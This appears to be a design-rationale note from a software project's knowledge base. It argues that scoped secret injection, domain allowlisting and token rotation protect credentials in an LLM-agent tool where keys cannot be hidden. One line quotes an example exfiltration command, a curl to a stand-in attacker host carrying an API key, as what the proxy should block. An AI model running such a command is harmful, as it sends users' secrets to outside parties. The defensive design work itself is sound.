---
type: belief
id: defense-in-depth-over-perfect-isolation
persona: architect
facets: [security, architecture, secrets, pragmatism]
entrenchment: medium
status: active
endorsed: true
extracted: 2026-02-22
revised: 2026-02-22
---

# defense-in-depth-over-perfect-isolation

Defense in depth beats perfect isolation: scoped injection + domain allowlisting + token rotation provides practical security where credential hiding is impossible.

## Statement

Defense in depth beats perfect isolation: scoped injection + domain allowlisting + token rotation provides practical security where credential hiding is impossible.

## Evidence

- [[session-20260222-165738]]: After discovering neither IronClaw nor Cloudflare Workers can hide credentials from HTTPS consumers, identified three practical layers that compose independently. (weight: 0.95)
- Layer 1 — Scoped injection: `run_with_secrets` currently injects ALL vault secrets. Scoping to only what the command needs (e.g., launcher knows claude needs only claude-oauth) eliminates cross-secret exposure. ~10 lines of code. (weight: 0.9)
- Layer 2 — Domain allowlisting: IronClaw's `DomainAllowlist` + `NetworkPolicyDecider` pattern. Even if LLM sees the API key, proxy blocks `curl evil.com/steal?key=$KEY`. Controls where credential CAN GO, not who can SEE it. (weight: 0.9)
- Layer 3 — Short-lived token rotation: If key leaks, damage window is bounded by token lifetime. OAuth refresh tokens enable this without re-authentication. (weight: 0.8)
- Each layer is independently valuable and doesn't require the others. Can be adopted incrementally. (weight: 0.85)

## Supports

- [[storage-encryption-vs-runtime-isolation]]
- [[bearer-token-forces-plaintext-exposure]]
- [[transport-security-by-trust-boundary]]

## Attacks

- Defeats "we need perfect credential isolation before shipping" — pragmatic layers provide real security now

## Attacked-By

- "Defense in depth is just admitting you can't solve the real problem" — fair critique, but the real problem (Bearer token protocol) is outside our control. Layers mitigate what we can control.

## Applied-In

- Layer 1 (scoped injection): Not yet implemented. Target: `src/adapters/launch.rs` — launcher knows which adapter needs which secret
- Layer 2 (domain allowlisting): `wit/deps/patina-host/host.wit:102` — already designed for WASM plugins. IronClaw reference: `src/sandbox/proxy/policy.rs`
- Layer 3 (token rotation): `src/commands/secrets.rs::setup_claude()` — currently stores long-lived token. Future: OAuth refresh flow
- At-rest encryption (Layer 0): DONE — `src/secrets/encrypted_file.rs`, `src/secrets/storage.rs`

## Revision Log

- 2026-02-22: Created — metrics computed by `patina scrape`
